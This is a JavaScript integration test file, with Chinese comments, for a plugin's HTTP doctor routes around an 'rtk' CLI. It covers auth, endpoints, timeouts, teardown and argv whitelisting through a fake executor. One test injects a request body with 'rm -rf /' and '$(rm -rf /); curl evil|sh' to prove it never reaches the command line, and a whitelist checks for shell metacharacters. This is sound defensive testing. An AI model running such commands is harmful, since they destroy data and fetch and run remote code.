// test/integration.test.mjs —— integration 形测试（假 ctx 真 apply + 真 handler 执行，INV-8 测试红线）
// 契约面：changes/20260929-phase0/tasks.md Task 6 测试契约（注册形 / 鉴权 / 三端点 / 超时失败 / 拆除幂等 / 零真实 rtk）。
// 测试红线（INV-4）：全程注入假 execFile——零真实 rtk 执行、零 node:child_process 直引；
//   「真 apply」用 enabled:false 短路 probeRtk（装载期零 spawn），三动作经注入缝走假执行器。
import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import { apply, buildDoctorTool } from '../lib/index.js'
import { API_PREFIX, registerDoctorRoutes } from '../lib/doctor-routes.js'
import { HEALTH_ITEMS, INSTALL_HINT } from '../lib/doctor.js'

// ───────────────────────── fixtures ─────────────────────────

/** 记录调用形的假 execFile（执行器注入缝）。 */
function fakeExec(impl) {
  const calls = []
  const exec = async (file, args, opts) => {
    calls.push({ file, args, opts })
    return impl(file, args, opts)
  }
  return { exec, calls }
}

/** 模拟 execFile 超时被 SIGTERM 杀死的 reject 形（不真等 5 秒）。 */
function timeoutError() {
  const e = new Error('Command failed: rtk')
  e.killed = true
  e.signal = 'SIGTERM'
  e.code = null
  return e
}

/** 模拟二进制缺失的 spawn 级失败（ENOENT）。 */
function enoentError() {
  const e = new Error('spawn rtk ENOENT')
  e.code = 'ENOENT'
  return e
}

/** 假 ctx（webServer.register 捕获 / connection.requestRejection / tools.register 捕获 / shell.resolve / effect / on / logger）。 */
function makeCtx({ rejection } = {}) {
  const registered = []
  const effects = []
  const toolCalls = []
  const onCalls = []
  const rejectionCalls = []
  const warnings = []
  return {
    registered,
    effects,
    toolCalls,
    onCalls,
    rejectionCalls,
    warnings,
    webServer: {
      register(spec) {
        registered.push(spec)
        const counter = { count: 0 }
        spec.disposeCalls = counter
        return () => {
          counter.count += 1
        }
      },
    },
    connection: {
      requestRejection(arg) {
        rejectionCalls.push(arg)
        return typeof rejection === 'function' ? rejection(arg) : rejection
      },
    },
    tools: { register(...a) {
      toolCalls.push(a)
    } },
    shell: { resolve: (request) => request },
    effect(fn) {
      effects.push(fn)
    },
    on(...a) {
      onCalls.push(a)
    },
    logger: {
      warn: (m) => warnings.push(String(m)),
      info() {},
      error() {},
    },
  }
}

/** 假 req（body 走 async iterator；reads 记录是否被消费——INV-7 证明 body 不进任何处理路径）。 */
function makeReq({ url = `${API_PREFIX}/version`, method = 'GET', headers = { 'x-test': '1' }, body = null } = {}) {
  const reads = { count: 0 }
  return {
    url,
    method,
    headers,
    reads,
    async *[Symbol.asyncIterator]() {
      reads.count += 1
      if (body != null) yield Buffer.from(String(body))
    },
  }
}

/** 假 res（捕获 writeHead/setHeader/end 落点）。 */
function makeRes() {
  const res = {
    status: null,
    headers: {},
    raw: null,
    body: null,
    writeHead(status, headers) {
      res.status = status
      Object.assign(res.headers, headers ?? {})
      return res
    },
    setHeader(k, v) {
      res.headers[k] = v
    },
    end(data) {
      res.raw = data == null ? null : String(data)
      res.body = res.raw == null ? null : JSON.parse(res.raw)
      return res
    },
  }
  return res
}

/** 注册真路由并拿到真 handler（经 webServer.register 捕获面执行，非绕过注册直调）。 */
function routesWith(opts = {}, ctxOpts = {}) {
  const ctx = makeCtx(ctxOpts)
  const dispose = registerDoctorRoutes(ctx, opts)
  const spec = ctx.registered[0]
  return {
    ctx,
    spec,
    dispose,
    async call(req) {
      const res = makeRes()
      await spec.handler(req, res)
      return res
    },
  }
}

/** 行为面白名单断言（INV-7）：执行器只见过三个固定 argv 形，零拼接零旗标。 */
const SAFE_ARGV = new Set(['--version', 'gain,-a,-f,json', 'rewrite,git status'])
function assertSafeArgv(calls) {
  for (const { file, args } of calls) {
    assert.ok(typeof file === 'string' && file.length > 0, 'rtkBin 必须是非空字符串')
    assert.ok(SAFE_ARGV.has(args.join(',')), `argv 越出白名单：${JSON.stringify(args)}`)
    assert.ok(args.every((s) => !s.includes('--reset')), '零破坏性旗标')
    assert.ok(!args.includes('run'), '零透传执行子命令')
    assert.ok(args.every((s) => !/[\n;|&$`]/.test(s)), '零 shell 元字符拼接')
  }
}

const SOURCE = fs.readFileSync(new URL('../lib/doctor-routes.js', import.meta.url), 'utf8')

// ───────────────────────── 注册面 ─────────────────────────

test('注册形：假 ctx 真 apply + registerDoctorRoutes → {kind:"prefix", path:"/api/rtk-kit"}', () => {
  const ctx = makeCtx()
  apply(ctx, { enabled: false, registerDoctorTool: false, awareness: 'off' }) // 真 apply（enabled:false 零 spawn）
  registerDoctorRoutes(ctx, {})
  assert.equal(ctx.registered.length, 1)
  const spec = ctx.registered[0]
  assert.equal(spec.kind, 'prefix')
  assert.equal(spec.path, '/api/rtk-kit')
  assert.equal(spec.path, API_PREFIX)
  assert.equal(typeof spec.handler, 'function')
})

test('拆除幂等（INV-8）：ctx.effect 收集的 disposer 两次不抛；底层 register disposer 恰一次', () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0', stderr: '' }))
  const ctx = makeCtx()
  apply(ctx, { enabled: false, registerDoctorTool: false, awareness: 'off' })
  const dispose = registerDoctorRoutes(ctx, { exec })
  ctx.effect(dispose) // Task 8 接线形：disposer 交 ctx.effect 收敛
  assert.ok(ctx.effects.length >= 2)
  for (const fn of ctx.effects) {
    assert.doesNotThrow(() => fn())
    assert.doesNotThrow(() => fn()) // 两次不抛
  }
  assert.equal(ctx.registered[0].disposeCalls.count, 1) // 幂等：底层 disposer 只真执行一次
})

// ───────────────────────── 鉴权（INV-9） ─────────────────────────

test('鉴权（INV-9）：requestRejection 回 401/403 → 直接回拒不进业务面（假 execFile 零调用）', async () => {
  for (const rejection of [401, 403]) {
    for (const [url, method] of [
      [`${API_PREFIX}/version`, 'GET'],
      [`${API_PREFIX}/gain`, 'GET'],
      [`${API_PREFIX}/health`, 'POST'],
      [`${API_PREFIX}/nope`, 'GET'],
    ]) {
      const { exec, calls } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0', stderr: '' }))
      const r = routesWith({ exec }, { rejection })
      const req = makeReq({ url, method, body: method === 'POST' ? '{}' : null })
      const res = await r.call(req)
      assert.equal(res.status, rejection, `${method} ${url} 应 ${rejection}`)
      assert.equal(res.body.error.code, 'AUTH_REQUIRED')
      assert.equal(typeof res.body.error.message, 'string')
      assert.equal(calls.length, 0, `${method} ${url} 未过鉴权不得进业务面（exec 零调用）`)
      assert.equal(r.ctx.rejectionCalls.length, 1)
      assert.deepEqual(r.ctx.rejectionCalls[0], { headers: req.headers }) // requestRejection({headers}) 缝形
    }
  }
})

test('鉴权（INV-9）：requestRejection 回 undefined → 业务面可达', async () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0\n', stderr: '' }))
  const r = routesWith({ exec }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/version` }))
  assert.equal(res.status, 200)
  assert.equal(res.body.data.available, true)
})

// ───────────────────────── 三端点（US-2 / US-3 / INV-3 / INV-5） ─────────────────────────

test('GET version：成功 {data}（版本号+路径+可用性；path=配置 rtkBin 原样回显）', async () => {
  const { exec, calls } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0\n', stderr: '' }))
  const r = routesWith({ exec, rtkBin: '/opt/rtk/bin/rtk' }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/version` }))
  assert.equal(res.status, 200)
  assert.deepEqual(res.body.data, { available: true, version: '0.49.0', path: '/opt/rtk/bin/rtk', hint: null })
  assert.deepEqual(calls[0].args, ['--version']) // 路由只走三动作白名单（M1 结案口径）
  assert.equal(calls[0].file, '/opt/rtk/bin/rtk')
})

test('GET version：rtk 缺失软回 {data:{available:false,version:null,path,hint}}（版本区显示安装提示，不抛 500）', async () => {
  const { exec } = fakeExec(async () => {
    throw enoentError()
  })
  const r = routesWith({ exec, rtkBin: 'rtk' }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/version` }))
  assert.equal(res.status, 200)
  assert.deepEqual(res.body.data, { available: false, version: null, path: 'rtk', hint: INSTALL_HINT })
})

test('GET gain：成功 {data}（summary 指标对象 + 日/周/月周期序列，-a 一次取全量）', async () => {
  const payload = {
    summary: { total_commands: 42, total_input: 100, total_output: 200, total_saved: 50, avg_savings_pct: 12.5, total_time_ms: 900, avg_time_ms: 21 },
    daily: [{ date: '2026-09-29', commands: 3, savings_pct: 10 }],
    weekly: [{ week_start: '2026-09-23', week_end: '2026-09-29', commands: 9 }],
    monthly: [{ month: '2026-09', commands: 40 }],
  }
  const { exec, calls } = fakeExec(async () => ({ code: 0, stdout: JSON.stringify(payload), stderr: '' }))
  const r = routesWith({ exec, rtkBin: '/opt/rtk/bin/rtk' }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/gain` }))
  assert.equal(res.status, 200)
  assert.equal(res.body.data.summary.total_commands, 42)
  assert.equal(res.body.data.daily[0].date, '2026-09-29')
  assert.equal(res.body.data.weekly[0].week_start, '2026-09-23')
  assert.equal(res.body.data.monthly[0].month, '2026-09')
  assert.deepEqual(calls[0].args, ['gain', '-a', '-f', 'json'])
})

test('GET gain：输出解析失败 → {error:{code:"RTK_ERROR"}}（US-4）', async () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: 'not json at all', stderr: '' }))
  const r = routesWith({ exec }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/gain` }))
  assert.equal(res.status, 500)
  assert.equal(res.body.error.code, 'RTK_ERROR')
  assert.equal(typeof res.body.error.message, 'string')
})

test('GET gain：rtk 缺失（ENOENT）→ {error:{code:"RTK_UNAVAILABLE"}} + 安装提示字段（fail-open，不抛 500 不炸装载）', async () => {
  const { exec } = fakeExec(async () => {
    throw enoentError()
  })
  const r = routesWith({ exec }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/gain` }))
  assert.equal(res.status, 503)
  assert.equal(res.body.error.code, 'RTK_UNAVAILABLE')
  assert.equal(res.body.error.hint, INSTALL_HINT)
})

test('超时（INV-5/US-4）：version/gain 超时 reject → {error:{code:"RTK_TIMEOUT"}} 供 UI 重试', async () => {
  for (const path of ['version', 'gain']) {
    const { exec } = fakeExec(async () => {
      throw timeoutError()
    })
    const r = routesWith({ exec }, { rejection: undefined })
    const res = await r.call(makeReq({ url: `${API_PREFIX}/${path}` }))
    assert.equal(res.status, 504, path)
    assert.equal(res.body.error.code, 'RTK_TIMEOUT', path)
    assert.equal(typeof res.body.error.message, 'string', path)
  }
})

// ───────────────────────── 健康面（INV-4 零污染 / fail-open） ─────────────────────────

test('POST health：{data} 七项定序 {id,label,status,detail}（proposal §4 健康=七项结果数组）', async () => {
  const { exec, calls } = fakeExec(async (file, args) => {
    const key = args.join(',')
    if (key === '--version') return { code: 0, stdout: 'rtk 0.49.0\n', stderr: '' }
    if (key === 'gain,-a,-f,json') return { code: 0, stdout: JSON.stringify({ summary: { total_commands: 7 } }), stderr: '' }
    return { code: 3, stdout: 'rtk git status', stderr: '' }
  })
  const historyReader = async ({ since } = {}) => {
    assert.equal(typeof since, 'string') // 压缩检查给 30 天窗口
    return { count: 10, avgSavingsPct: 25 }
  }
  const r = routesWith({ exec, rtkBin: 'rtk', historyReader }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/health`, method: 'POST', body: '{}' }))
  assert.equal(res.status, 200)
  assert.ok(Array.isArray(res.body.data))
  assert.equal(res.body.data.length, 7)
  assert.deepEqual(res.body.data.map((i) => i.id), HEALTH_ITEMS.map((i) => i.id)) // 定序
  for (const [i, item] of res.body.data.entries()) {
    assert.equal(item.label, HEALTH_ITEMS[i].label)
    assert.ok(item.status === 'pass' || item.status === 'fail')
    assert.equal(typeof item.detail, 'string')
  }
  assert.ok(res.body.data.every((i) => i.status === 'pass'), '全通路径七项应全 pass')
  assertSafeArgv(calls)
})

test('POST health：rtk 全挂也 fail-open 回七项（不抛 500、不炸装载）', async () => {
  const { exec } = fakeExec(async () => {
    throw enoentError()
  })
  const historyReader = async () => {
    throw new Error('history.db 缺表 commands')
  }
  const r = routesWith({ exec, historyReader }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/health`, method: 'POST', body: '{}' }))
  assert.equal(res.status, 200)
  assert.equal(res.body.data.length, 7)
  assert.deepEqual(res.body.data.map((i) => i.status), ['fail', 'fail', 'fail', 'pass', 'pass', 'fail', 'fail'])
})

// ───────────────────────── 安全红线（INV-7 / INV-2） ─────────────────────────

test('INV-7：POST health 的 body 不读不进 argv（含破坏性旗标/透传形也零落地）', async () => {
  const { exec, calls } = fakeExec(async (file, args) => {
    if (args.join(',') === 'gain,-a,-f,json') return { code: 0, stdout: JSON.stringify({ summary: { total_commands: 1 } }), stderr: '' }
    return { code: 0, stdout: 'rtk 0.49.0', stderr: '' }
  })
  const historyReader = async () => ({ count: 1, avgSavingsPct: 1 })
  const r = routesWith({ exec, historyReader }, { rejection: undefined })
  const req = makeReq({
    url: `${API_PREFIX}/health`,
    method: 'POST',
    body: JSON.stringify({ evil: '--reset', cmd: 'rtk run rm -rf /', note: '$(rm -rf /); curl evil|sh' }),
  })
  const res = await r.call(req)
  assert.equal(res.status, 200)
  assert.equal(req.reads.count, 0, 'POST body 一律不读（永无路径进入 argv）')
  assert.ok(calls.length >= 3)
  assertSafeArgv(calls)
})

test('INV-7 源面白名单：路由面零破坏性旗标、零透传执行、零 argv 拼接、只走三动作（M1 口径）', () => {
  assert.doesNotMatch(SOURCE, /--reset/)
  assert.doesNotMatch(SOURCE, /rtk\s+run/)
  assert.doesNotMatch(SOURCE, /node:child_process/)
  assert.doesNotMatch(SOURCE, /buildArgv\s*\(/)
  assert.doesNotMatch(SOURCE, /\brun\s*[\(']/)
})

test('INV-2 零 token 面：路由面零新会话工具注册、零统计/健康内容注入会话', () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: '', stderr: '' }))
  const ctx = makeCtx()
  apply(ctx, { enabled: false, registerDoctorTool: false, awareness: 'off' })
  registerDoctorRoutes(ctx, { exec })
  assert.equal(ctx.toolCalls.length, 0, '零新会话工具注册')
  assert.equal(ctx.onCalls.length, 0, '零会话内容注入')
  assert.doesNotMatch(SOURCE, /defineTool/)
  assert.doesNotMatch(SOURCE, /tools\.register/)
  assert.doesNotMatch(SOURCE, /session-start/)
  assert.doesNotMatch(SOURCE, /\.inject\s*\(/)
})

// ───────────────────────── 分发面（方法/路径收口） ─────────────────────────

test('分发面：方法不匹配 405 + allow 头；未知路径 404；码族收口四码', async () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0', stderr: '' }))
  const r = routesWith({ exec }, { rejection: undefined })

  const wrongMethod = await r.call(makeReq({ url: `${API_PREFIX}/version`, method: 'POST', body: '{}' }))
  assert.equal(wrongMethod.status, 405)
  assert.equal(wrongMethod.headers.allow, 'GET')
  assert.equal(wrongMethod.body.error.code, 'RTK_ERROR')

  const wrongHealthMethod = await r.call(makeReq({ url: `${API_PREFIX}/health`, method: 'GET' }))
  assert.equal(wrongHealthMethod.status, 405)
  assert.equal(wrongHealthMethod.headers.allow, 'POST')

  const unknown = await r.call(makeReq({ url: `${API_PREFIX}/nope` }))
  assert.equal(unknown.status, 404)
  assert.equal(unknown.body.error.code, 'RTK_ERROR')

  for (const res of [wrongMethod, wrongHealthMethod, unknown]) {
    assert.ok(['AUTH_REQUIRED', 'RTK_UNAVAILABLE', 'RTK_TIMEOUT', 'RTK_ERROR'].includes(res.body.error.code))
    assert.equal(typeof res.body.error.message, 'string')
    assert.ok(!('data' in res.body), '失败信封不得混入 data')
  }
})

// ───────────────────────── Task 8：doctor 瘦身（INV-6） ─────────────────────────

test('INV-6 doctor 瘦身：gain 段受 config.doctorGain && args.gain!==false 门控，缺省不输出', async () => {
  // 真 apply 注册面：唯一会话工具仍为 rtk_doctor（零新增 defineTool），参数 description 同步 default false
  const ctx = makeCtx()
  apply(ctx, { enabled: false, registerDoctorTool: true, awareness: 'off', doctorGain: false })
  assert.equal(ctx.toolCalls.length, 1)
  const tool = ctx.toolCalls[0][0]
  assert.equal(tool.name, 'rtk_doctor')
  // defineTool 归一为 JSON Schema 形（模型可见面）
  assert.equal(tool.parameters.type, 'object')
  assert.match(tool.parameters.properties.gain.description, /default false/)

  const { exec, calls } = fakeExec(async (file, args) => {
    if (args.join(',') === '--version') return { code: 0, stdout: 'rtk 0.49.0\n', stderr: '' }
    return { code: 0, stdout: JSON.stringify({ summary: { total_commands: 7 } }), stderr: '' }
  })
  const base = { rtkBin: 'rtk', exec }
  // doctorGain 缺省 false：args.gain=true 也不输出（config 门控优先）
  const r1 = await buildDoctorTool(base).execute({ gain: true })
  assert.doesNotMatch(r1.text, /rtk gain/)
  // doctorGain:true → 含 gain 段
  const r2 = await buildDoctorTool({ ...base, doctorGain: true }).execute({})
  assert.match(r2.text, /--- rtk gain/)
  assert.match(r2.text, /total_commands/)
  // doctorGain:true 但 args.gain===false → 不输出
  const r3 = await buildDoctorTool({ ...base, doctorGain: true }).execute({ gain: false })
  assert.doesNotMatch(r3.text, /rtk gain/)
  // 双缺省 → 不输出（缺省口径）
  const r4 = await buildDoctorTool(base).execute({})
  assert.doesNotMatch(r4.text, /rtk gain/)
  assertSafeArgv(calls) // doctor 工具动作走 doctor.js 白名单（INV-7）
})

test('INV-2/INV-7 源面（index.js）：defineTool 调用恰一处（既有 rtk_doctor 瘦身复用）、零破坏性旗标暴露', () => {
  const INDEX = fs.readFileSync(new URL('../lib/index.js', import.meta.url), 'utf8')
  assert.equal(INDEX.match(/\bdefineTool\s*\(/g)?.length ?? 0, 1, '零新增 defineTool（唯一会话工具仍 rtk_doctor）')
  assert.doesNotMatch(INDEX, /--reset/)
  assert.doesNotMatch(INDEX, /spawnSync\([^)]*['"]run['"]/)
})

// ───────────────────────── Task 8：接线面（fail-open / 工厂形 effect） ─────────────────────────

test('fail-open（INV-8）：缺 webServer/connection 缝的假 ctx → apply 不抛、留痕恰一、resolve 改写缝仍工作', () => {
  const warnings = []
  const effects = []
  const orig = (request) => request
  const bare = {
    shell: { resolve: orig },
    tools: { register() {} },
    effect(fn, label) {
      effects.push({ fn, label })
    },
    on() {},
    logger: { warn: (m) => warnings.push(String(m)) },
  }
  apply(bare, { enabled: false, registerDoctorTool: false, awareness: 'off' })
  assert.equal(warnings.length, 1, '缺缝留痕恰一（fail-open 不炸装载）')
  assert.match(warnings[0], /webServer\/connection 服务缝(缺失|半缺)/)
  // resolve 改写缝仍工作：包壳在位 + enabled:false 恒等放行（零 spawn）
  assert.notEqual(bare.shell.resolve, orig, 'resolve 缝包壳仍在')
  const req = { command: 'git status', stdin: null }
  assert.deepEqual(bare.shell.resolve(req), req)
  // 工厂形 effect（队长硬约束）：body 当场跑、返回函数才是拆除器；拆除后还原
  assert.equal(effects.length, 1)
  const wrapped = bare.shell.resolve
  const dispose = effects[0].fn()
  assert.equal(typeof dispose, 'function', '工厂形：返回函数才是拆除器')
  assert.equal(bare.shell.resolve, wrapped, '拆除前包壳仍在（工厂当场跑不还原）')
  dispose()
  assert.notEqual(bare.shell.resolve, wrapped, '拆除后包壳卸下（还原 resolve）')
  assert.deepEqual(bare.shell.resolve(req), req, '还原后恒等形')
  assert.doesNotThrow(() => dispose()) // 拆除幂等
})

test('接线正路径：假 ctx 带 webServer/connection + ctx.plugin 子插件形 → prefix 注册 + 工厂形 effect 拆除', () => {
  const ctx = makeCtx()
  const pluginCalls = []
  ctx.plugin = (spec) => {
    pluginCalls.push(spec)
  }
  apply(ctx, { enabled: false, registerDoctorTool: false, awareness: 'off' })
  assert.equal(pluginCalls.length, 1, '数据面走 ctx.plugin 子插件形接线')
  const spec = pluginCalls[0]
  assert.deepEqual(spec.inject, ['webServer', 'connection'])
  // 模拟宿主：子插件 ctx 拿到两缝后跑 apply（注册动作在 effect 执行体内当场跑）
  const effects = []
  const sub = {
    ...ctx,
    effect(fn, label) {
      effects.push({ fn, label })
    },
  }
  spec.apply(sub)
  assert.equal(effects.length, 1)
  assert.equal(effects[0].label, 'rtk-kit: doctor-routes')
  const dispose = effects[0].fn() // 工厂当场跑 → 返回拆除器
  assert.equal(typeof dispose, 'function')
  assert.equal(ctx.registered.length, 1)
  assert.equal(ctx.registered[0].kind, 'prefix')
  assert.equal(ctx.registered[0].path, '/api/rtk-kit')
  dispose()
  dispose() // 拆除幂等
  assert.equal(ctx.registered[0].disposeCalls.count, 1)
})

// ───────────────────────── Task 8：T6 审查 deferred 项收口（F1/F2） ─────────────────────────

test('F1：opts.connection 不得遮蔽 ctx.connection 鉴权缝（展开序 {...opts, connection, warn}）', async () => {
  const { exec } = fakeExec(async () => ({ code: 0, stdout: 'rtk 0.49.0\n', stderr: '' }))
  const bogusCalls = []
  const bogus = {
    requestRejection(arg) {
      bogusCalls.push(arg)
      return 403
    },
  }
  const r = routesWith({ exec, connection: bogus }, { rejection: undefined })
  const res = await r.call(makeReq({ url: `${API_PREFIX}/version` }))
  assert.equal(res.status, 200, '鉴权缝必须走 ctx.connection（rejection: undefined=放行）')
  assert.equal(r.ctx.rejectionCalls.length, 1)
  assert.equal(bogusCalls.length, 0, 'opts.connection 不得被调用（不得遮蔽缝）')
})

test('F2：鉴权缝抛错 → dispatch 外层兜底回错误信封（绝不 unhandled rejection）', async () => {
  const throwing = () => {
    throw new Error('鉴权缝炸了')
  }
  for (const [url, method] of [
    [`${API_PREFIX}/version`, 'GET'], // handler 内 authGate 抛（异步拒绝）
    [`${API_PREFIX}/nope`, 'GET'], // 分发面 authGate 抛（同步）
  ]) {
    const { exec } = fakeExec(async () => ({ code: 0, stdout: '', stderr: '' }))
    const r = routesWith({ exec }, { rejection: throwing })
    const res = await r.call(makeReq({ url, method }))
    assert.equal(res.status, 500, `${url} 应回错误信封`)
    assert.equal(res.body.error.code, 'RTK_ERROR')
    assert.equal(typeof res.body.error.message, 'string')
    assert.ok(!('data' in res.body), '失败信封不得混入 data')
  }
})
